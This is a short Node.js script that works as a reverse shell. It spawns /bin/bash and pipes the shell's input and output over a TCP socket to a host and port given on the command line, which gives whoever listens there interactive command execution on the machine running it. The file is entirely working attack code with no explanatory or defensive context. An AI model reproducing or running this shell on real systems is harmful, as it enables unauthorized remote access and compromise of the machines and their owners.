// Uses child_process library
const net = require("net")
const sh = require("child_process").exec("/bin/bash");
const client = new net.Socket();
if (process.argv.length <= 2) {
	console.log("Usage: node socket_childnode.js <destination> <port>");
	console.log("Usage: node socket_childnode.js 192.168.1.1 80");
	process.exit(-1);
}
var destination = process.argv[2];
var port = process.argv[3];
client.connect(port, destination, () => {
	client.pipe(sh.stdin)
	sh.stdout.pipe(client)
	sh.stderr.pipe(client)
})